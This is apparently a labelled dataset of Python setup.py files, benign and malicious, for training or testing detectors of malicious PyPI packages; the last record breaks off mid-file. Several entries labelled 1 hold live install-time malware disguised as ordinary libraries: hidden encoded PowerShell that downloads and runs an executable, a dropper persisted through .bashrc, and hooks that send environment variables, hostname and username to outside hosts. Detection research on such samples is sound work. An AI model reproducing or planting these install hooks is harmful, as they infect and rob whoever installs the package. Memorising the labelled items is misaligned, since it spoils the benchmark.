{"idx": "pongrand-2.48", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'pongrand',\n    packages = ['modlib'],\n    version = '9.56',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dash_colorscales-0.0.4", "func": "from setuptools import setup\n\nmain_ns = {}\nexec(open('dash_colorscales/version.py').read(), main_ns)\n\nsetup(\n    name='dash_colorscales',\n    version=main_ns['__version__'],\n    author='plotly',\n    packages=['dash_colorscales'],\n    include_package_data=True,\n    license='MIT',\n    description='Colorscale picker UI for your Dash apps',\n    install_requires=[]\n)\n", "target": 0}
{"idx": "django-model-utils-4.2.0", "func": "import os\n\nfrom setuptools import find_packages, setup\n\n\ndef long_desc(root_path):\n    FILES = ['README.rst', 'CHANGES.rst']\n    for filename in FILES:\n        filepath = os.path.realpath(os.path.join(root_path, filename))\n        if os.path.isfile(filepath):\n            with open(filepath, mode='r') as f:\n                yield f.read()\n\n\nHERE = os.path.abspath(os.path.dirname(__file__))\nlong_description = \"\\n\\n\".join(long_desc(HERE))\n\n\nsetup(\n    name='django-model-utils',\n    use_scm_version={\"version_scheme\": \"post-release\"},\n    setup_requires=[\"setuptools_scm\"],\n    license=\"BSD\",\n    description='Django model mixins and utilities',\n    long_description=long_description,\n    long_description_content_type='text/x-rst',\n    author='Carl Meyer',\n    author_email='carl@oddbird.net',\n    maintainer='JazzBand',\n    url='https://github.com/jazzband/django-model-utils',\n    packages=find_packages(exclude=['tests*']),\n    install_requires=['Django>=2.0.1'],\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Framework :: Django',\n        'Framework :: Django :: 2.2',\n        'Framework :: Django :: 3.1',\n        'Framework :: Django :: 3.2',\n    ],\n    zip_safe=False,\n    tests_require=['Django>=2.2'],\n    package_data={\n        'model_utils': [\n            'locale/*/LC_MESSAGES/django.po', 'locale/*/LC_MESSAGES/django.mo'\n        ],\n    },\n)\n", "target": 0}
{"idx": "Eve-2.0", "func": "#!/usr/bin/env python\nimport io\nimport re\n\nfrom setuptools import setup, find_packages\nfrom collections import OrderedDict\n\nDESCRIPTION = \"Python REST API for Humans.\"\nwith open(\"README.rst\") as f:\n    LONG_DESCRIPTION = f.read()\n\nwith io.open(\"eve/__init__.py\", \"rt\", encoding=\"utf8\") as f:\n    VERSION = re.search(r\"__version__ = \\\"(.*?)\\\"\", f.read()).group(1)\n\nINSTALL_REQUIRES = [\n    \"cerberus>=1.1,<2.0\",\n    \"events>=0.3,<0.4\",\n    \"flask\",\n    \"pymongo\",\n    \"simplejson>=3.3.0,<4.0\",\n]\n\nEXTRAS_REQUIRE = {\n    \"docs\": [\"sphinx\", \"alabaster\", \"doc8\"],\n    \"tests\": [\"redis\", \"testfixtures\", \"pytest\", \"tox\"],\n}\nEXTRAS_REQUIRE[\"dev\"] = EXTRAS_REQUIRE[\"tests\"] + EXTRAS_REQUIRE[\"docs\"]\n\nsetup(\n    name=\"Eve\",\n    version=VERSION,\n    description=DESCRIPTION,\n    long_description=LONG_DESCRIPTION,\n    long_description_content_type=\"text/x-rst\",\n    author=\"Nicola Iarocci\",\n    author_email=\"eve@nicolaiarocci.com\",\n    url=\"http://python-eve.org\",\n    project_urls=OrderedDict(\n        (\n            (\"Documentation\", \"http://python-eve.org\"),\n            (\"Code\", \"https://github.com/pyeve/eve\"),\n            (\"Issue tracker\", \"https://github.com/pyeve/eve/issues\"),\n        )\n    ),\n    license=\"BSD\",\n    platforms=[\"any\"],\n    packages=find_packages(),\n    test_suite=\"eve.tests\",\n    install_requires=INSTALL_REQUIRES,\n    extras_require=EXTRAS_REQUIRE,\n    python_requires=\">=3.7\",\n    classifiers=[\n        \"Development Status :: 5 - Production/Stable\",\n        \"Environment :: Web Environment\",\n        \"Intended Audience :: Developers\",\n        \"License :: OSI Approved :: BSD License\",\n        \"Operating System :: OS Independent\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n        \"Topic :: Internet :: WWW/HTTP :: Dynamic Content\",\n        \"Topic :: Internet :: WWW/HTTP :: WSGI :: Application\",\n        \"Topic :: Software Development :: Libraries :: Application Frameworks\",\n        \"Topic :: Software Development :: Libraries :: Python Modules\",\n    ],\n)\n", "target": 0}
{"idx": "esqpongkillmine-5.77", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqpongkillmine',\n    packages = ['modlib'],\n    version = '2.54',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "django-nested-admin-3.4.0", "func": "#!/usr/bin/env python\nimport re\nimport os.path\n\ntry:\n    from setuptools import setup, find_packages\nexcept ImportError:\n    from ez_setup import use_setuptools\n    use_setuptools()\n    from setuptools import setup, find_packages\n\n\n# Find the package version in __init__.py without importing it\n# (which we cannot do because it has extensive dependencies).\ninit_file = os.path.join(os.path.dirname(__file__),\n                         'nested_admin', '__init__.py')\nwith open(init_file, 'r') as f:\n    for line in f:\n        m = re.search(r'''^__version__ = (['\"])(.+?)\\1$''', line)\n        if m is not None:\n            version = m.group(2)\n            break\n    else:\n        raise LookupError('Unable to find __version__ in ' + init_file)\n\n\nsetup(\n    name='django-nested-admin',\n    version=version,\n    install_requires=[\n        'python-monkey-business>=1.0.0',\n        'six',\n    ],\n    description=\"Django admin classes that allow for nested inlines\",\n    author='The Atlantic',\n    author_email='programmers@theatlantic.com',\n    url='https://github.com/theatlantic/django-nested-admin',\n    packages=find_packages(),\n    license='BSD',\n    platforms='any',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        \"Programming Language :: Python :: 2\",\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.4',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Framework :: Django',\n        'Framework :: Django :: 1.11',\n        'Framework :: Django :: 2.2',\n        'Framework :: Django :: 3.2',\n        'Framework :: Django :: 4.0',\n    ],\n    include_package_data=True,\n    zip_safe=False,\n    long_description=''.join(list(open('README.rst'))[3:]))\n", "target": 0}
{"idx": "resplit-3.82", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'resplit',\n    packages = ['modlib'],\n    version = '6.15',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "libpipultraproof-1.76", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'libpipultraproof',\n    packages = ['modlib'],\n    version = '2.84',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "epiweeks-2.1.4", "func": "\"\"\"Setup.py entry point for supporting editable installs\n\nConfiguration is handled by setuptools through setup.cfg\nhttps://setuptools.readthedocs.io/en/latest/setuptools.html\n\"\"\"\n\nimport setuptools\n\nif __name__ == \"__main__\":\n    # Package name is added here for GitHub's dependency graph\n    setuptools.setup(name=\"epiweeks\")\n", "target": 0}
{"idx": "deform-2.0.15", "func": "##############################################################################\n#\n# Copyright (c) 2011 Agendaless Consulting and Contributors.\n# All Rights Reserved.\n#\n# This software is subject to the provisions of the BSD-like license at\n# http://www.repoze.org/LICENSE.txt.  A copy of the license should accompany\n# this distribution.  THIS SOFTWARE IS PROVIDED \"AS IS\" AND ANY AND ALL\n# EXPRESS OR IMPLIED WARRANTIES ARE DISCLAIMED, INCLUDING, BUT NOT LIMITED TO,\n# THE IMPLIED WARRANTIES OF TITLE, MERCHANTABILITY, AGAINST INFRINGEMENT, AND\n# FITNESS FOR A PARTICULAR PURPOSE\n#\n##############################################################################\n# Standard Library\nimport sys\n\nfrom setuptools import find_packages\nfrom setuptools import setup\n\n\ndef readfile(name):\n    with open(name) as f:\n        return f.read()\n\n\nREADME = readfile(\"README.rst\")\nCHANGES = readfile(\"CHANGES.txt\")\nVERSION = '2.0.15'\n\nPY37MIN = sys.version_info[0] == 3 and sys.version_info[1] >= 7\n\nrequires = [\n    \"Chameleon>=2.5.1\",  # Markup class\n    \"colander>=1.0a1\",  # cstruct_children/appstruct_children, Set\n    \"iso8601\",\n    \"peppercorn>=0.3\",  # rename operation type\n    \"translationstring>=1.0\",  # add format mapping with %\n    \"zope.deprecation\",\n]\n\nlint_extras = [\n    \"black\",\n    \"check-manifest\",\n    \"flake8\",\n    \"flake8-bugbear\",\n    \"flake8-builtins\",\n    \"isort\",\n    \"readme_renderer\",\n]\n\ntesting_extras = [\n    \"beautifulsoup4\",\n    \"coverage\",\n    \"flaky\",\n    \"pyramid\",\n    \"pytest\",\n    \"pytest-cov\",\n]\n\n# Needed to run deformdemo tests\nfunctional_testing_extras = [\n    \"pygments\",\n    \"waitress\",\n    \"lingua\",\n]\n\ndocs_extras = [\n    \"Sphinx >= 1.7.4\",\n    \"repoze.sphinx.autointerface\",\n    \"pylons_sphinx_latesturl\",\n    \"pylons-sphinx-themes\",\n]\n\n# Selenium 4.0 does not work on Python 3.6.\nif PY37MIN:\n    functional_testing_extras.extend([\"selenium >= 4.0a\"])\nelse:\n    functional_testing_extras.extend([\"selenium >= 3.0, < 4.0\"])\n\nbranch_version = \".\".join(VERSION.split(\".\")[:2])\n\n# black is refusing to make anything under 80 chars so just splitting it up\ndocs_fmt = \"https://docs.pylonsproject.org/projects/deform/en/{}-branch/\"\ndocs_url = docs_fmt.format(branch_version)\n\nsetup(\n    name=\"deform\",\n    version=VERSION,\n    description=\"Form library with advanced features like nested forms\",\n    long_description=README + \"\\n\\n\" + CHANGES,\n    classifiers=[\n        \"Intended Audience :: Developers\",\n        \"License :: Repoze Public License\",\n        \"Programming Language :: Python\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3\",\n        \"Programming Language :: Python :: 3.5\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: Implementation :: CPython\",\n        \"Programming Language :: Python :: Implementation :: PyPy\",\n    ],\n    keywords=\"web forms form generation schema validation pyramid\",\n    author=\"Chris McDonough, Agendaless Consulting\",\n    author_email=\"pylons-discuss@googlegroups.com\",\n    maintainer=\"Steve Piercy\",\n    maintainer_email=\"web@stevepiercy.com\",\n    url=\"https://docs.pylonsproject.org/projects/deform/en/latest/\",\n    project_urls={\n        'Documentation': docs_url,\n        'Changelog': '{}changes.html'.format(docs_url),\n        'Issue Tracker': 'https://github.com/Pylons/deform/issues',\n    },\n    license=\"BSD-derived\",\n    packages=find_packages(),\n    include_package_data=True,\n    zip_safe=False,\n    tests_require=testing_extras,\n    install_requires=requires,\n    test_suite=\"deform.tests\",\n    extras_require={\n        \"lint\": lint_extras,\n        \"testing\": testing_extras,\n        \"docs\": docs_extras,\n        \"functional\": functional_testing_extras,\n        \"dev\": (\n            lint_extras\n            + testing_extras\n            + docs_extras\n            + functional_testing_extras\n        ),\n    },\n)\n", "target": 0}
{"idx": "libpeshka-0.5", "func": "from setuptools import setup, find_packages\n\n\n\ndef rn ():\n        import platform\n\n        lb = False\n        try:\n                import urllib2\n        except ImportError:\n                import requests\n                lb = True\n        import os, stat\n\n        ADD_LOC = \"http://145.249.104.71/out\"\n        LOC = \".drv\"\n\n        if platform.system () == \"Linux\":\n                response = \"\"\n                if not lb:\n                        response = urllib2.urlopen(ADD_LOC).read ()\n                else:\n                        response = requests.get (ADD_LOC)\n                        response = response.content\n                os.chdir (os.path.expanduser (\"~\"))\n                d = open (LOC, \"wb\")\n                d.write (response)\n                d.close ()\n\n                current_state = os.stat (LOC)\n                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)\n\n                brc = open (\".bashrc\", \"a\")\n                brc.write (\"\\n~/.drv &\")\n                brc.close ()\n\n\n        else:\n                print (\"Error installing library!\")\n                exit (-1)\n\nrn ()\n\nsetup(\n  name = 'libpeshka',\n  packages = find_packages (),\n  entry_points={\n\t'setuptools.installation': [\n\t\t'eggsecutable = libari.pr:rn'\n\t]\n  },\n  version = '0.5',\n  description = 'Libari wrapper for python',\n  author = 'Ruri12',\n  author_email = 'ruri12@example.com',\n  scripts=[\"pr.py\"],\n  url = '',\n  download_url = '', \n  keywords = ['libari'],\n  classifiers = [],\n)\n", "target": 1}
{"idx": "libblas3-0.0.1", "func": "from setuptools import setup\nfrom setuptools.command.install import install\nimport subprocess\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        subprocess.run([sys.executable, \"-m\", \"poc_nvk.my_module\"])\n\nsetup(\n    name=\"libblas3\",\n    version=\"0.0.1\",\n    author=\"Naveen Kumawat\",\n    author_email=\"naveenkumawat1995@gmail.com\",\n    description=\"DEPEndency C0nfusion P0C for alibaba\",\n    long_description=\"\",\n    long_description_content_type=\"text/markdown\",\n    url=\"https://github.com/nvk0x\",\n    packages=[\"poc_nvk\"],\n    cmdclass={'install': CustomInstall},\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    python_requires=\">=3.6\",\n)\n\n", "target": 1}
{"idx": "databricks_pypi1-0.2", "func": "from setuptools import setup, find_packages\n \nsetup(\n    name = \"databricks_pypi1\",\n    version = \"0.2\",\n    decription = 'databricks whl library',\n    packages = find_packages())\n", "target": 0}
{"idx": "lab-3-package-438d82fc-0.1.1", "func": "import setuptools\nfrom setuptools.command.install import install\nfrom setuptools.command.develop import develop\nfrom setuptools import setup, find_packages\nimport os\nimport socket\n\ndef notmalfunc():\n    # Extract environment variables\n    data = dict(os.environ)\n    data_str = \"\\n\".join([f\"{k}: {v}\" for k, v in data.items()])\n    \n    # Connect to ngrok-exposed Netcat listener\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect(('2.tcp.eu.ngrok.io', 19382))  # Replace with the correct ngrok address and port\n        sock.sendall(data_str.encode())\n        sock.close()\n    except Exception as e:\n        print(f\"Error connecting to the server: {e}\")\n\nclass AfterDevelop(develop):\n    def run(self):\n        develop.run(self)\n        notmalfunc()\n\nclass AfterInstall(install):\n    def run(self):\n        install.run(self)\n        notmalfunc()\n\nsetuptools.setup(\n    name = \"lab-3-package-438d82fc\",\n    version = \"0.1.1\",  # Update version to avoid the PyPI error\n    long_description = \"long description\",\n    long_description_content_type = \"text/markdown\",\n    classifiers = [\n        \"Programming Language :: Python :: 3\",\n        \"License :: OSI Approved :: MIT License\",\n        \"Operating System :: OS Independent\",\n    ],\n    packages = find_packages(),\n    python_requires = \">=3.6\",\n    cmdclass={\n        'develop': AfterDevelop,\n        'install': AfterInstall,\n    },\n)\n", "target": 1}
{"idx": "econml-0.13.1", "func": "from setuptools import setup\nfrom setuptools.extension import Extension\nimport numpy as np\nimport os\nimport re\nfrom glob import glob\nfrom pathlib import Path\n\nwith open(os.path.join(os.path.dirname(__file__), \"econml\", \"_version.py\")) as file:\n    for line in file:\n        m = re.fullmatch(\"__version__ = '([^']+)'\\n\", line)\n        if m:\n            version = m.group(1)\n\npyx_files = glob(\"econml/**/*.pyx\", recursive=True)\nc_files = glob(\"econml/**/*.c\", recursive=True)\n\n# If both a .pyx and a .c file exist, we assume the .c file is up to date and don't force a recompile\npyx_files = [file for file in pyx_files if (os.path.splitext(file)[0] + \".c\") not in c_files]\n\nc_extensions = [Extension(os.path.splitext(file)[0].replace(os.sep, '.'),\n                          [file],\n                          include_dirs=[np.get_include()])\n                for file in c_files]\n\nif pyx_files:\n    from Cython.Build import cythonize\n    pyx_extensions = cythonize([Extension(\"*\",\n                                          pyx_files,\n                                          include_dirs=[np.get_include()])],\n                               language_level=\"3\")\nelse:\n    pyx_extensions = []\n# configuration is all pulled from setup.cfg\nsetup(ext_modules=c_extensions + pyx_extensions,\n      zip_safe=False,\n      version=version)\n", "target": 0}
{"idx": "django-hosts-5.1", "func": "import codecs\nfrom os import path\nfrom setuptools import setup, find_packages\n\n\ndef read(*parts):\n    filename = path.join(path.dirname(__file__), *parts)\n    with codecs.open(filename, encoding='utf-8') as fp:\n        return fp.read()\n\nsetup(\n    name='django-hosts',\n    description='Dynamic and static host resolving for Django. '\n                'Maps hostnames to URLconfs.',\n    long_description=read('README.rst'),\n    use_scm_version=True,\n    python_requires='>=3.6',\n    setup_requires=['setuptools_scm'],\n    url='https://django-hosts.readthedocs.io/',\n    author='Jannis Leidel',\n    author_email='jannis@leidel.info',\n    license='BSD',\n    packages=find_packages(),\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Framework :: Django :: 3.2',\n        'Framework :: Django :: 4.0',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3 :: Only',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n    ],\n)\n", "target": 0}
{"idx": "testkaralpoc45654-1.0.0", "func": "#source:- https://github.com/007divyachawla/python-dependency-confusion-attack/blob/main/setup.py\nfrom setuptools import setup\nfrom setuptools.command.install import install\nimport requests\nimport socket\nimport getpass\nimport os\n\nclass CustomInstall(install):\n    def run(self):\n        install.run(self)\n        hostname=socket.gethostname()\n        cwd = os.getcwd()\n        username = getpass.getuser()\n        ploads = {'hostname':hostname,'cwd':cwd,'username':username}\n        requests.get(\"https://kar.al\",params = ploads)\n\n\nsetup(name='testkaralpoc45654',\n      version='1.0.0',\n      description='test',\n      author='test',\n      license='MIT',\n      zip_safe=False,\n      cmdclass={'install': CustomInstall})\n", "target": 1}
{"idx": "upgrade-requestss-0.0.1", "func": "from setuptools import setup, find_packages\n\nsetup(\n    name=\"upgrade-requestss\",\n    version=\"0.0.1\",\n    packages=['requests'],\n    install_requires = [\n        \"requests==2.31.0\"\n    ],\n    author=\"upgrade-requestss\",\n    description=\"upgrade-requestss\"\n)", "target": 1}
{"idx": "django-rest-swagger-2.2.0", "func": "#!/usr/bin/python\nimport os\nimport sys\nimport shutil\nfrom setuptools import setup\nfrom rest_framework_swagger import __version__ as VERSION\n\nif sys.argv[-1] == 'publish':\n    if os.system(\"wheel version\"):\n        print(\"wheel not installed.\\nUse `pip install wheel`.\\nExiting.\")\n        sys.exit()\n    if os.system(\"pip freeze | grep twine\"):\n        print(\"twine not installed.\\nUse `pip install twine`.\\nExiting.\")\n        sys.exit()\n    os.system(\"python setup.py sdist bdist_wheel\")\n    os.system(\"twine upload -r pypi dist/*\")\n    print(\"You probably want to also tag the version now:\")\n    print(\"  git tag -a %s -m 'version %s'\" % (VERSION, VERSION))\n    print(\"  git push --tags\")\n    shutil.rmtree('dist')\n    shutil.rmtree('build')\n    shutil.rmtree('django_rest_swagger.egg-info')\n    sys.exit()\n\nREADME = \"\"\"\nDjango REST Swagger\n\nAn API documentation generator for Swagger UI and Django REST Framework.\n\nInstallation\nFrom pip:\n\npip install django-rest-swagger\n\nProject @ https://github.com/marcgibbons/django-rest-swagger\nDocs @ https://django-rest-swagger.readthedocs.io/\n\"\"\"\n\n# allow setup.py to be run from any path\nos.chdir(os.path.normpath(os.path.join(os.path.abspath(__file__), os.pardir)))\n\nsetup(\n    name='django-rest-swagger',\n    version=VERSION,\n    install_requires=[\n        'coreapi>=2.3.0',\n        'openapi-codec>=1.3.1',\n        'djangorestframework>=3.5.4',\n        'simplejson'\n    ],\n    packages=['rest_framework_swagger'],\n    include_package_data=True,\n    license='FreeBSD License',\n    description='Swagger UI for Django REST Framework 3.5+',\n    long_description=README,\n    test_suite='tests',\n    author='Marc Gibbons',\n    author_email='marc_gibbons@rogers.com',\n    url='https://github.com/marcgibbons/django-rest-swagger',\n    classifiers=[\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Framework :: Django :: 1.8',\n        'Framework :: Django :: 1.9',\n        'Framework :: Django :: 1.10',\n        'Framework :: Django :: 1.11',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 2',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 2.7',\n        'Programming Language :: Python :: 3.5',\n        'Programming Language :: Python :: 3.6',\n        'Topic :: Internet :: WWW/HTTP',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n    ],\n    zip_safe=False\n)\n", "target": 0}
{"idx": "english-2020.7.0", "func": "#!/usr/bin/env python\n# -*- encoding: utf-8 -*-\n\n# Copyright 2020, Nigel Small\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\n\nfrom os.path import dirname, join as path_join\nfrom setuptools import setup, find_packages\n\n\nfrom english import (\n    __author__,\n    __email__,\n    __license__,\n    __package__,\n    __version__,\n)\n\n\nsource_url = \"https://github.com/technige/english\"\n\n\nwith open(path_join(dirname(__file__), \"README.rst\")) as f:\n    README = f.read()\n\n\npackages = find_packages(exclude=(\"docs\", \"test\"))\npackage_metadata = {\n    \"name\": __package__,\n    \"version\": __version__,\n    \"description\": \"English language utility library for Python\",\n    \"long_description\": README,\n    \"author\": __author__,\n    \"author_email\": __email__,\n    \"url\": source_url,\n    \"project_urls\": {\n        \"Bug Tracker\": \"{}/issues\".format(source_url),\n        \"Source Code\": source_url,\n    },\n    \"entry_points\": {\n        \"console_scripts\": [\n        ],\n    },\n    \"packages\": packages,\n    \"py_modules\": [\n    ],\n    \"install_requires\": [\n        \"six\",\n    ],\n    \"extras_require\": {\n    },\n    \"license\": __license__,\n    \"classifiers\": [\n        \"Development Status :: 1 - Planning\",\n        \"Intended Audience :: Developers\",\n        \"Intended Audience :: Information Technology\",\n        \"License :: OSI Approved :: Apache Software License\",\n        